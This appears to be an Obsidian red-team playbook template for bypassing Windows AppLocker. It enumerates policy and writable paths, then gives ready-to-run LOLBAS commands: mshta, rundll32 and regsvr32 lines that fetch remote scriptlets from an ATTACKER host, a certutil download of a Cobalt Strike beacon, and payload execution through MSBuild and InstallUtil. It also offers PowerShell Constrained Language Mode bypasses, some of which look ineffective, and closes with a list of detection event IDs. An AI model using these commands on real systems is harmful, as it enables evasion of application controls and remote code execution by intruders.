---
# Attack-specific fields
al_bypass_method: lolbas
al_writable_path:
al_clm_bypass:
notes:
---

# Application Whitelisting Bypass (AppLocker)

> [!abstract] Attack Summary
> **AppLocker** restricts which executables, scripts, and DLLs can run. When rules are misconfigured or bypass paths exist, attackers can still execute arbitrary code. Key techniques: **LOLBAS** (Living Off the Land Binaries), **writable path abuse**, **DLL execution**, **CLM bypass**, and **InstallUtil/MSBuild**.

---

## Baseline (from [[00 - Engagement Baseline]])

```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
dv.table(["Field", "Value"], [
  ["Domain",   b?.domain   ?? "—"],
  ["Username", b?.username ?? "—"],
  ["OS Env",   b?.os_env   ?? "—"],
]);
```

---

## Attack-Specific Configuration

```dataviewjs
const p = dv.current();
const methods = ["lolbas","writable_path","dll_execution","clm_bypass","installutil","regasm","msbuild"];
const methodOptions = methods.map(m => `option(${m})`).join(',');

dv.table(["Field", "Value"], [
  ["Bypass Method",     `\`INPUT[inlineSelect(defaultValue(${p.al_bypass_method ?? 'lolbas'}),${methodOptions}):al_bypass_method]\``],
  ["Writable Path",     `\`INPUT[text:al_writable_path]\``],
]);
```

---

## Step 1 — Enumerate AppLocker Policy

**Windows**
```dataviewjs
dv.paragraph("```powershell\n# Enumerate AppLocker policy\nGet-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections\n\n# Via registry\nGet-ChildItem -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\SrpV2'\n\n# Check CLM (Constrained Language Mode)\n$ExecutionContext.SessionState.LanguageMode\n\n# Check enforcement mode per category\nGet-AppLockerPolicy -Effective | Format-List *\n```");
```

**Windows — PowerView/ADSearch (GPO-based)**
```dataviewjs
dv.paragraph("```bash\nexecute-assembly C:\\Tools\\ADSearch\\ADSearch\\bin\\Release\\ADSearch.exe " +
  "--search \"(objectCategory=groupPolicyContainer)\" --attributes displayName,gPCFileSysPath\n\n# Then look at each GPO's Machine\\Microsoft\\Windows NT\\AppLocker folder in SYSVOL\n```");
```

---

## Step 2 — Find Writable Paths

> [!info] AppLocker default rules allow execution from `C:\Windows\*` and `C:\Program Files\*`. Look for writable directories in these paths.

**Windows — Find writable directories**
```dataviewjs
dv.paragraph("```bash\nexecute-assembly C:\\Tools\\AccessChk\\accesschk64.exe -accepteula -uwdq C:\\Windows\\\nexecute-assembly C:\\Tools\\AccessChk\\accesschk64.exe -accepteula -uwdq \"C:\\Windows\\Tasks\"\nexecute-assembly C:\\Tools\\AccessChk\\accesschk64.exe -accepteula -uwdq \"C:\\Windows\\Temp\"\nexecute-assembly C:\\Tools\\AccessChk\\accesschk64.exe -accepteula -uwdq \"C:\\Windows\\tracing\"\n\n# Common writable allowed paths:\n# C:\\Windows\\Tasks\n# C:\\Windows\\Temp\n# C:\\Windows\\tracing\n# C:\\Windows\\Registration\\CRMLog\n# C:\\Windows\\System32\\FxsTmp\n# C:\\Windows\\System32\\com\\dmp\n```");
```

Writable path found: `INPUT[text:al_writable_path]`

---

## Method A — LOLBAS Execution

> [!info] Use trusted Windows binaries that allow arbitrary code execution.

```dataviewjs
dv.paragraph("```bash\n# MSBuild — execute C# via .csproj\nC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe payload.csproj\n\n# InstallUtil — execute .NET assembly via installer\nC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe\n\n# Regasm — execute via COM registration\nC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\regasm.exe /U payload.dll\n\n# Regsvcs\nC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\regsvcs.exe payload.dll\n\n# Mshta\nmshta.exe javascript:a=(GetObject('script:http://ATTACKER/payload.sct')).Exec();close();\n\n# Rundll32\nrundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:http://ATTACKER/payload.sct\")\n\n# CertUtil (download + execute)\ncertutil.exe -urlcache -split -f http://ATTACKER/beacon.exe C:\\Windows\\Temp\\beacon.exe\n```");
```

---

## Method B — DLL Execution via Beacon

> [!info] Drop a DLL payload and execute via rundll32 — AppLocker's DLL rules are often disabled.

**Windows — Cobalt Strike Beacon DLL**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const lhost = b?.lhost ?? "ATTACKER_IP";
dv.paragraph("```bash\n# Generate Beacon DLL\n# In CS: Attacks > Packages > Windows Executable (Stageless)\n# Select DLL type\n\n# Upload to target\nupload beacon.dll\n\n# Execute via rundll32\nshell rundll32.exe C:\\Windows\\Tasks\\beacon.dll,DllMain\n\n# Or via regsvr32 (scriptlets)\nshell regsvr32.exe /s /n /u /i:http://" + lhost + "/payload.sct scrobj.dll\n```");
```

---

## Method C — PowerShell CLM Bypass

> [!info] AppLocker puts PowerShell in Constrained Language Mode (CLM). Several bypasses exist.

```dataviewjs
dv.paragraph("```powershell\n# Check current language mode\n$ExecutionContext.SessionState.LanguageMode\n\n# Bypass 1: PowerShell v2 (if installed)\npowershell -Version 2 -ExecutionPolicy Bypass -Command Get-ExecutionPolicy\n\n# Bypass 2: Downgrade via WMI\n[wmiclass]'root\\default:StdRegProv' | ForEach-Object {}\n\n# Bypass 3: Use .NET directly\n[Reflection.Assembly]::LoadWithPartialName('Microsoft.CSharp')\n\n# Bypass 4: Use runspace without PS restriction\n# (complex — use CobaltStrike execute-assembly for .NET instead)\n\n# Check if bypass worked\n$ExecutionContext.SessionState.LanguageMode\n# Should show FullLanguage\n```");
```

---

## Method D — Scripting Bypass

```dataviewjs
dv.paragraph("```bash\n# cscript.exe / wscript.exe bypass (if not blocked)\ncscript.exe payload.vbs\nwscript.exe payload.js\n\n# If .hta is allowed:\nmshta.exe payload.hta\n\n# Direct .NET CLR host (no PowerShell)\nexecute-assembly directly from Cobalt Strike beacon\n\n# Python (if installed)\npython.exe payload.py\n```");
```

---

## OPSEC

> [!warning] Detection Indicators
> - LOLBAS execution: **Event 4688** (process creation) — parent/child process anomalies.
> - CLM bypass attempts: **PowerShell Event 4103/4104** (script block logging).
> - AppLocker blocks: **Event 8003/8004** (DLL/exe blocked).
> - Rundll32 executing from unusual paths or with unusual arguments.
> - MSBuild/InstallUtil spawning network connections or child processes.

---

## Notes & Results

`INPUT[textarea:notes]`
